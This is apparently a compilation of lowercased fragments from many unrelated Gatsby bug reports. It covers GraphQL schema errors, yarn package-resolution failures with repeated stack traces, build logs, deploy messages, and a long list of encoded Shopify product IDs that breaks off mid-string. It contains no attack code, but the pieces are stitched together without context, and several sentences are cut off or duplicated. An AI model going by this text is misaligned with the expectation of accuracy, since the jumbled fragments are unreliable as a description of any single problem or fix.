#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog-core/src/templates/posts-query.js there was an error in your graphql query: cannot query field "siteurl" on type "sitesitemetadata"
if you don\'t expect "siteurl" to exist on the type "sitesitemetadata" it is most likely a typo.
however, if you expect "siteurl" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "siteurl" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "sitesitemetadata":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog/src/components/seo.js there was an error in your graphql query: cannot query field "blogthemeconfig" on type "query"
if you don\'t expect "blogthemeconfig" to exist on the type "query" it is most likely a typo.
however, if you expect "blogthemeconfig" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "blogthemeconfig" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "query":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog/src/hooks/configoptions.js
showing many errror
tests are returning ```shell
found 44 vulnerabilities (42 low, 2 high) in 2472 scanned packages run `npm audit fix` to fix 42 of them
2 vulnerabilities require manual review
see the full report for details
exited with code exit status 1
see the errors above
the project failed to build.
build will not complete or will not produce a working site
query fails for a known field, such as `availablequantity`.
eslint warnings in file that doesn't exist
i get the error: error: schema must contain uniquely named types but contains multiple types named "sys" and the gatsby graphql endpoint: does not display the hasura node.
the new field is available, but `body`, `excerpt` and other important field are not: ![]( this results in errors when trying to query for these fields
``` error #85923 graphql there was an error in your graphql query: cannot query field "body" on type "mdx".
css fails to initialize until i cycle a few pages
it doesn't seem to return
the develop script runs without apparent errors but then the dev server crashes because .cache/json is empty
```yarn global v1.22.4
[1/4] resolving packages...
error couldn\'t find package "@hapi/joi@^15.1.1" required by "gatsby-cli" on the "npm" registry.
info visit for documentation about this command.
warning gatsby-cli > yurnalist > babel-runtime > core-js@2.6.11: core-js@<3 is no longer maintained and not recommended for usage due to the number of issues
please, upgrade your dependencies to the actual version of core-js@3.
error: couldn\'t find package "@hapi/joi@^15.1.1" required by "gatsby-recipes@^0.2.7" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@turist/time@^0.0.1" required by "gatsby-telemetry@^1.3.26" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@mdx-js/mdx@^2.0.0-next.4" required by "gatsby-recipes@^0.2.7" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@mdx-js/react@^2.0.0-next.4" required by "gatsby-recipes@^0.2.7" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@mdx-js/runtime@^2.0.0-next.4" required by "gatsby-recipes@^0.2.7" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@mdx-js/react@^1.5.2" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@turist/fetch@^7.1.6" required by "gatsby-telemetry@^1.3.26" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@reach/alert@0.10.3" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@reach/combobox@0.10.3" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@reach/dialog@0.10.3" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@reach/tabs@0.10.3" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@reach/menu-button@0.10.3" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@reach/popover@0.10.3" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@reach/tooltip@0.10.3" required by "gatsby-interface@^0.0.166" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@jest/types@^25.5.0" required by "pretty-format@^25.5.0" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@urql/core@^1.12.3" required by "urql@^1.9.7" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@mdx-js/util@^2.0.0-next.7" required by "remark-mdxjs@^2.0.0-next.4" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@szmarczak/http-timer@^1.1.2" required by "got@^9.6.0" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@styled-system/css@^5.0.16" required by "theme-ui@^0.2.49" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@sindresorhus/is@^0.14.0" required by "got@^9.6.0" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
error: couldn\'t find package "@hapi/hoek@8.x.x" required by "gatsby-recipes@^0.2.7" on the "npm" registry
at messageerror.extendablebuiltin (/usr/share/yarn/lib/cli.js:721:66) at new messageerror (/usr/share/yarn/lib/cli.js:750:123) at packagerequest.<anonymous> (/usr/share/yarn/lib/cli.js:36539:17) at generator.throw (<anonymous>) at step (/usr/share/yarn/lib/cli.js:310:30) at /usr/share/yarn/lib/cli.js:323:13 at process._tickcallback (internal/process/next_tick.js:68:7)
install error
$ yarn deploy
yarn run v1.22.4
$ gh-pages -d public -b master
the following paths are ignored by one of your .gitignore files:
node_modules
hint: use -f if you really want to add them.
hint: turn this message off by running
hint: "git config advice.addignoredfile false"
after a consecutive develop (or build after failed development), the post that contains double space has its frontmatter image not recognized my transformer sharp.
not possible to query any specific exported constants nor their nested fields
i also tried to explicitly set the `exports` in `gatsby-node.js`, but as expected this was unsuccessful (example below):
type exportmetadata { author: string
} type exporttype { metadata: exportmetadata
} type mdx { exports: exporttype
there was an error compiling the html.js component for the development server
error: cannot find module 'react-dom/server' require stack: - /users/user/git-projects/app-dev/public/render-page.js - /users/user/git-projects/app-dev/node_modules/gatsby/dist/utils/worker/render-html.js - /users/user/git-projects/app-dev/node_modules/gatsby/dist/utils/worker/child.js - /users/user/git-projects/app-dev/node_modules/jest-worker/build/workers/processchild.js
the build crashes after the `onpostbuild` phase: ```
> gatsby build success open and validate gatsby-configs - 0.039s
success load plugins - 1.016s
warn the google analytics plugin requires a tracking id
did you mean to add it?
success onpreinit - 0.017s
success delete html and css files from previous builds - 0.011s
success initialize cache - 0.008s
success copy gatsby files - 0.051s
warn gatsby-plugin-feed was initialized in gatsby-config.js without a feeds option.
this means that the plugin will use the internal rss feed creation, which may not match
your use case.
this behavior will be removed in the next major release of gatsby-plugin-feed.
success onprebootstrap - 0.016s
success createschemacustomization - 0.144s
success checking for changed pages - 0.002s
success source and transform nodes - 0.085s
success building schema - 0.260s
success createpages - 0.028s
success checking for changed pages - 0.001s
success createpagesstatefully - 0.049s
success update schema - 0.025s
success onpreextractqueries - 0.003s
success extract queries from components - 0.267s
success write out redirect data - 0.002s
success build manifest and related icons - 0.098s
success onpostbootstrap - 0.102s
info bootstrap finished - 6.147s
success run static queries - 0.056s - 2/2 35.43/s
success run page queries - 0.179s - 7/7 39.09/s
success write out requires - 0.006s
success building production javascript and css bundles - 6.423s
success rewriting compilation hashes - 0.007s
success building static html for pages - 1.548s - 7/7 4.52/s
success generating image thumbnails - 8.330s - 9/9 1.08/s
success onpostbuild - 0.021s
info done building in 14.522525164 sec
not finished generating image thumbnails - 0.044s (sharp:63870): glib-critical **: 13:23:13.517: g_hash_table_lookup: assertion 'hash_table != null' failed (sharp:63870): glib-critical **: 13:23:13.543: g_hash_table_lookup: assertion 'hash_table != null' failed (sharp:63870): glib-critical **: 13:23:13.557: g_hash_table_lookup: assertion 'hash_table != null failed
``` ### workarounds because the build succeeds if it can use cached images, then you can make it work by putting an identical `childimagesharp` query somewhere else in the site (which will generate the images to the cache)
however, there are cases where this isn ideal, such as if you want to use different image resolutions.
{ "data": { "allmysqlposts": { "edges": [ { "node": { "slug": "vacancy-javascript-developer" } } ] } }
only last item from job_post table is returned
there are multiple records saved in database but we get only last one
it happens even if we apply filter to our query, only the last item which matches filter is returned.
process doesn't properly end when exiting terminal
i am met with the error pasted above on any gatsby command
`<lastmod>nan-nan-nan</lastmod>`
browser starts loading and hangs forever, changes are not picked up
manual page refresh is not working either
only restart of develop script can help
however, graphiql editor keeps working.
<img width="565" alt="screen shot 2020-08-01 at 1 22 54 pm" src=" ">
![localhost_8000_starters_zag_gatsby-starter-pod6_ (1)](
some images finish processing late, resulting in missing images in some pages.
there is content output to public/static/d/<filename>.json where filename is just a 10 digit id and if a change is made in contentful that results in a change to the content of these files, the name of the file remains the same and breaks the caching i have in place
(have a workaround in place for files in public/static/d for now that just applies a max-age=0 rule for these files for the time being)
all anyone ever sees is "source and transform nodes" ..
error: invariant violation: encountered an error trying to infer a graphql typ e for: `products___node`
there is no corresponding node with the `id` field m atching: "shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzi2mdy4mdm4ndu0mq==,s hopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzi5mjkwmtcxntk5nw==,shopify__pro duct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzixnti0otg1otm4otu=,shopify__product__z2lko i8vc2hvcglmes9qcm9kdwn0lzqzodg4nju2mzg2oq==,shopify__product__z2lkoi8vc2hvcglm es9qcm9kdwn0lzixntyzodm4otu2ntu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn 0lzi5mjkwmjk5mzk0oq==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzi2mdy3od y0nzgznw==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqzodg4mjkynjyymq==, shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzixntmxnzm4mtezmdm=,shopify__pr oduct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqynji5nza3odu4otu=,shopify__product__z2lk oi8vc2hvcglmes9qcm9kdwn0lzixntmxmzaymjk4njm=,shopify__product__z2lkoi8vc2hvcgl mes9qcm9kdwn0lzqzndu3otcwmtc3mdm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdw n0lzixnty1ntgxodg2ndc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqznje1o dy5mzqwnq==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqyodu3mdiyndi0mdc= ,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzm4odqxnzq2mdy0mzk=,shopify__p roduct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzixntyzmtm5mzu5nzu=,shopify__product__z2l koi8vc2hvcglmes9qcm9kdwn0lzi2mdy4mjm1mdyymq==,shopify__product__z2lkoi8vc2hvcg lmes9qcm9kdwn0lzmzndy0nzezmje4oq==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kd wn0lzqynzazmjexmdcwndc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2 mdk2mdaxmdm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mta2mtu5mte =,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mjmyotcxmjc=,shopify__ product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mjm3odg2ndc=,shopify__product__z2 lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mjqyodaxnjc=,shopify__product__z2lkoi8vc2hvc glmes9qcm9kdwn0lzq1mze2mju2nty0mjm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9k dwn0lzq1mziznti0odm0mze=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mzq xotu4odawmzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mzuzntmynzg1nj c=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1ndi1njexmjq0ntu=,shopify_ _product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2ndywmtg1ndc4mtu=,shopify__product__z 2lkoi8vc2hvcglmes9qcm9kdwn0lzixntmxmdq0nzqymtu=,shopify__product__z2lkoi8vc2hv cglmes9qcm9kdwn0lzqzodg3odqwndyznw==,shopify__product__z2lkoi8vc2hvcglmes9qcm9 kdwn0lzmzndy5ntqzmjiymq==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mz e2ndi0mda4nze=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzi1nde3otaxnjczm w==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzi1nde3otg2odcwmq==,shopify __product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ndawnzqzndm=,shopify__product__ z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2nda4otm1ndm=,shopify__product__z2lkoi8vc2h vcglmes9qcm9kdwn0lzq1mze2ndeyntm5ote=,shopify__product__z2lkoi8vc2hvcglmes9qcm 9kdwn0lzi5mjkwmjczmtgwnq==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1m ze2nde5nzq4odc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njm0mdexnzky mzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzmzndcwmzgymdgyoq==,shopif y__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ndc5mdu4otu=,shopify__product_ _z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njm0mtuwndaxmdm=,shopify__product__z2lkoi8vc2 hvcglmes9qcm9kdwn0lzi5mjg5otcxnze0oq==,shopify__product__z2lkoi8vc2hvcglmes9qc m9kdwn0lzqzndu3nzcwmjkymjm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqw mdy3ndkwndq4mzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ntaxmzq xmtk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ndy3ote3odm=,shopi fy__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njm0otuymjmzotk=,shopify__product __z2lkoi8vc2hvcglmes9qcm9kdwn0lzqyodu3mdcymjmxndm=,shopify__product__z2lkoi8vc 2hvcglmes9qcm9kdwn0lzq1mze2nteyndgymze=,shopify__product__z2lkoi8vc2hvcglmes9q cm9kdwn0lzq1mze2nti3ntu1ntk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq 1mze1mtu3nti1nte=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njm1mdy2ot ixotk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji4nte3ntgxodm=,shop ify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqzmzgwodu3ntcwmze=,shopify__produc t__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mtixodg3nzu=,shopify__product__z2lkoi8v c2hvcglmes9qcm9kdwn0lzq1mze2mtcxmdm5nzu=,shopify__product__z2lkoi8vc2hvcglmes9 qcm9kdwn0lzm5mzkymtuynzgznw==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lz q1nji4ntczmjg3ndm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji0odk0m dk2mzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji3mjgxntcyodc=,sho pify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji4njm3nteynze=,shopify__produ ct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njqyodk0mje0mtu=,shopify__product__z2lkoi8 vc2hvcglmes9qcm9kdwn0lzq1mzizmdk3mjexote=,shopify__product__z2lkoi8vc2hvcglmes 9qcm9kdwn0lzq1mze2mtq4nzu3nte=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0l zq1njqzmdaznju5mjc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji3mjyw njaxmzu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njqzmte4mde5ntk=,sh opify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njq0mjgwnji4mjm=,shopify__prod uct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njqzmzkwnjq5mzu=,shopify__product__z2lkoi 8vc2hvcglmes9qcm9kdwn0lzq1njq0mju2mzc5ote=,shopify__product__z2lkoi8vc2hvcglme s9qcm9kdwn0lzq1nji4njyynde2mzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0 lzq1mze2mtuymdm0mze=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji3mze 5ntgznzu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njqyotu4ndm5ndm=,s hopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji4njewmze1mjc=,shopify__pro duct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji3mzy3nzuynze=,shopify__product__z2lko i8vc2hvcglmes9qcm9kdwn0lzq1nji2nzy5nda5mdm=,shopify__product__z2lkoi8vc2hvcglm es9qcm9kdwn0lzq1njq0mza4ndgxmdm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn 0lzq1njq0mjy4odmxnzu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njqznd i2mdm4nzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njqzmzu1ntg3ntk=, shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njqzmdq2mju3njc=,shopify__pr oduct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nji4njc0ntqwntu=,shopify__product__z2lk oi8vc2hvcglmes9qcm9kdwn0lzq1nji4njq2mdmymzk=,shopify__product__z2lkoi8vc2hvcgl mes9qcm9kdwn0lzq1nji4ntq1mta2otu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdw n0lzq1mze2mtgwmje0nzk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2m ji0nzc5mjc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ndmymjawnze= ,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nju2otiyoduwmze=,shopify__p roduct__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mzcyntyyotu=,shopify__product__z2l koi8vc2hvcglmes9qcm9kdwn0lzq1mze2mtm4oti3mte=,shopify__product__z2lkoi8vc2hvcg lmes9qcm9kdwn0lzq1mze2mti1mty0ntu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kd wn0lzq0odmymji5mjk1mte=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1 ntexnzq3ntk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1nte5otm5ntk =,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1njeymtq3mde2nze=,shopify__ product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzixnty1mzq4ota1otk=,shopify__product__z2 lkoi8vc2hvcglmes9qcm9kdwn0lzq1njiwmdazmtq0nze=,shopify__product__z2lkoi8vc2hvc glmes9qcm9kdwn0lzq0odmyntyymje3otk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9k dwn0lzq1mze0mzk4otq2mze=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzm5mzk ymdkzodaxmw==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ndqzotk3mt k=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2ndi3mjg1nte=,shopify_ _product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mje3mjqynjm=,shopify__product__z 2lkoi8vc2hvcglmes9qcm9kdwn0lze0mtq0ndg1nzg2njm=,shopify__product__z2lkoi8vc2hv cglmes9qcm9kdwn0lzq1mze2mjewmdmznjc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9 kdwn0lzq1mze1mtmzmjc3mtk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1nt u0mtkwotewndc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2mzkymzuxmtmwn jm=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqznjqxnzy5ndkznte=,shopify __product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mjczoduxote=,shopify__product__ z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1ntu0odu1ndq1nte=,shopify__product__z2lkoi8vc2h vcglmes9qcm9kdwn0lzq1mze2mtg1ndu3njc=,shopify__product__z2lkoi8vc2hvcglmes9qcm 9kdwn0lzm5mzkxodg0mdg2mq==,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1m ze2mtkwnzawntu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0nti3mdy5 mtk=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq2mze1nzu4ntuymdc=,shopif y__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze1mtg3mzq0mzk=,shopify__product_ _z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1ntu0ntu5odc4mtu=,shopify__product__z2lkoi8vc2 hvcglmes9qcm9kdwn0lzqzotq1mtg5mzc3mdm=,shopify__product__z2lkoi8vc2hvcglmes9qc m9kdwn0lzqzmju5mdu4mju4otu=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1 mze2ntcwndgxnjc=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze0ntg1nzi zote=,shopify__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzq1mze2mtu5ntcwotu=,shopi fy__product__z2lkoi8vc2hvcglmes9qcm9kdwn0lzqzmju5ndq0mjy1otk=,shopify__product 